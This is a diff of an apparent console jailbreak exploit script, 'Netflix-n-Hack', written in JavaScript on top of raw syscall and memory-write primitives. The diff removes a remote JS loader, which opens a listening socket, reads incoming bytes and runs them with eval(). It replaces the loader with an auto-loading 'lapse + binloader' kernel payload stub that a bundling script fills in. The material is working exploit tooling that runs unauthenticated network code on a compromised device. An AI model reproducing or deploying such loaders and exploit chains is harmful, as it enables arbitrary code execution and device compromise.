@@ -1315,59 +1315,7 @@ function main () {
             syscall(SYSCALL.close, fd);  
         }
 
-        send_notification("ð\x9F¥³ð\x9F¥³ Netflix-n-Hack ð\x9F¥³ð\x9F¥³");
-
-
-        /***** Let's receive JS payloads *****/
-
-        const MAXSIZE = 500 * 1024;
-
-        const sockaddr_in = malloc(16);
-        const addrlen = malloc(8);
-        const enable = malloc(4);
-        const len_ptr = malloc(8);
-        const payload_buf = malloc(MAXSIZE);
-        let sock_fd = null;
-        let port = 0;
-
-        function create_socket() {
-            // Clear sockaddr
-            for (let i = 0; i < 16; i++) write8_uncompressed(sockaddr_in + BigInt(i), 0);
-
-            const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
-            if (sock_fd === 0xffffffffffffffffn) {
-                throw new Error("Socket creation failed: " + hex(sock_fd));
-            }
-
-            write32_uncompressed(enable, 1);
-            syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);
-
-            write8_uncompressed(sockaddr_in + 1n, AF_INET);
-            write16_uncompressed(sockaddr_in + 2n, 0);        // port 0
-            write32_uncompressed(sockaddr_in + 4n, 0);        // INADDR_ANY
-
-            const bind_ret = syscall(SYSCALL.bind, sock_fd, sockaddr_in, 16n);
-            if (bind_ret === 0xffffffffffffffffn) {
-                syscall(SYSCALL.close, sock_fd);
-                throw new Error("Bind failed: " + hex(bind_ret));
-            }
-
-            const listen_ret = syscall(SYSCALL.listen, sock_fd, 3n);
-            if (listen_ret === 0xffffffffffffffffn) {
-                syscall(SYSCALL.close, sock_fd);
-                throw new Error("Listen failed: " + hex(listen_ret));
-            }
-
-            return sock_fd;
-        }
-
-        function get_port(sock_fd) {
-            write32_uncompressed(len_ptr, 16);
-            syscall(SYSCALL.getsockname, sock_fd, sockaddr_in, len_ptr);
-
-            const port_be = read16_uncompressed(sockaddr_in + 2n);
-            return Number(((port_be & 0xFFn) << 8n) | ((port_be >> 8n) & 0xFFn));
-        }
+        send_notification("Netflix-n-Hack Auto");
 
         function get_current_ip() {
             // Get interface count
@@ -1375,20 +1323,20 @@ function main () {
             if (count < 0) {
                 return null;
             }
-            
+
             // Allocate buffer for interfaces
             const iface_size = 0x1e0;
             const iface_buf = malloc(iface_size * count);
-            
+
             // Get interface list
             if (Number(syscall(SYSCALL.netgetiflist, iface_buf, BigInt(count))) < 0) {
                 return null;
             }
-            
+
             // Parse interfaces
             for (let i = 0; i < count; i++) {
                 const offset = BigInt(i * iface_size);
-                
+
                 // Read interface name (null-terminated string at offset 0)
                 let iface_name = "";
                 for (let j = 0; j < 16; j++) {
@@ -1396,7 +1344,7 @@ function main () {
                     if (c === 0) break;
                     iface_name += String.fromCharCode(c);
                 }
-                
+
                 // Read IP address (4 bytes at offset 0x28)
                 const ip_offset = offset + 0x28n;
                 const ip1 = Number(read8_uncompressed(iface_buf + ip_offset));
@@ -1404,139 +1352,23 @@ function main () {
                 const ip3 = Number(read8_uncompressed(iface_buf + ip_offset + 2n));
                 const ip4 = Number(read8_uncompressed(iface_buf + ip_offset + 3n));
                 const iface_ip = ip1 + "." + ip2 + "." + ip3 + "." + ip4;
-                
+
                 // Check if this is eth0 or wlan0 with valid IP
-                if ((iface_name === "eth0" || iface_name === "wlan0") && 
+                if ((iface_name === "eth0" || iface_name === "wlan0") &&
                     iface_ip !== "0.0.0.0" && iface_ip !== "127.0.0.1") {
                     return iface_ip;
                 }
             }
-            
+
             return null;
         }
-        
-        let attemp = 0;
 
-        do {
-            main_sock_fd = create_socket();
-            main_port = get_port(main_sock_fd);
-            if(main_port == 60000)
-                break;
+        logger.log("Auto-loading lapse + binloader...");
+        logger.flush();
 
-            syscall(SYSCALL.close, main_sock_fd);
-            attemp++;
-
-        } while (attemp <= 50000);
-
-        if(attemp == 50000) {
-            logger.log("Could not get port 60000 after 50000 attemps");
-        }
-
-        sock_fd = create_socket();
-        port = get_port(sock_fd);
-        const current_ip = get_current_ip();
-
-        if (current_ip === null) {
-            send_notification("No network available!\nAborting...");
-            throw new Error("No network available!\nAborting...");
-        }
-
-        let network_str = current_ip + ":" + port;
-        logger.log("Remote JS Loader listening on " + network_str);
-        send_notification("Remote JS Loader\nListening on " + network_str);
-        logger.flush(); // Force display before entering async loop
-
-        // Async socket accept loop - allows logger to stay responsive
-        (async () => {
-            while (true) {
-                try {
-                    logger.log("Awaiting connection at " + network_str);
-                    logger.flush();
-
-                    // Yield to event loop before blocking accept() call
-                    await new Promise(resolve => nrdp.setTimeout(resolve, 10));
-
-                    write32_uncompressed(addrlen, 16);
-                    const client_fd = syscall(SYSCALL.accept, sock_fd, sockaddr_in, addrlen);
-
-                if (client_fd === 0xffffffffffffffffn) {
-                    logger.log("accept() failed: " + hex(client_fd) + " - recreating socket");
-                    syscall(SYSCALL.close, sock_fd);
-
-                    const recreated = recreate_socket();
-                    sock_fd = recreated.sock_fd;
-                    port = recreated.port;
-                    network_str = recreated.network_str;
-                    continue;
-                }
-
-                logger.log("Client connected, fd: " + Number(client_fd));
-                logger.flush();
-
-                let total_read = 0;
-                let read_error = false;
-
-                while (total_read < MAXSIZE) {
-                    const bytes_read = syscall(
-                        SYSCALL.read,
-                        client_fd,
-                        payload_buf + BigInt(total_read),
-                        BigInt(MAXSIZE - total_read)
-                    );
-
-                    const n = Number(bytes_read);
-
-                    if (n === 0) break;
-                    if (n < 0) {
-                        logger.log("read() error: " + n);
-                        read_error = true;
-                        break;
-                    }
-
-                    total_read += n;
-                    logger.log("Read " + n + " bytes");
-                }
-
-                logger.log("Finished reading, total=" + total_read + " error=" + read_error);
-
-                if (read_error || total_read === 0) {
-                    logger.log("No valid data received");
-                    syscall(SYSCALL.close, client_fd);
-                    continue;
-                }
-
-                const bytes = new Uint8Array(total_read);
-                for (let i = 0; i < total_read; i++) {
-                    let read = read8_uncompressed(payload_buf + BigInt(i));
-                    bytes[i] = Number(read);
-                }
-
-                // Convert bytes to string in chunks to avoid stack overflow
-                let js_code = '';
-                const CHUNK_SIZE = 8192;
-                for (let i = 0; i < total_read; i += CHUNK_SIZE) {
-                    const end = Math.min(i + CHUNK_SIZE, total_read);
-                    const chunk = bytes.slice(i, end);
-                    js_code += String.fromCharCode.apply(null, chunk);
-                }
-
-                logger.log("Executing payload...");
-                logger.flush();
-                eval(js_code);
-                logger.log("Executed successfully");
-                logger.flush();
-
-                syscall(SYSCALL.close, client_fd);
-                logger.log("Connection closed");
-                logger.flush();
-
-            } catch (e) {
-                logger.log("ERROR in accept loop: " + e.message);
-                logger.log(e.stack);
-                logger.flush();
-            }
-        }
-        })(); // End of async socket accept loop
+// ===== LAPSE_BINLOADER_PAYLOAD_START =====
+// This marker will be replaced by the bundle script with the actual payload
+// ===== LAPSE_BINLOADER_PAYLOAD_END =====
 
     } catch (e) {
         logger.log("EXCEPTION: " + e.message);
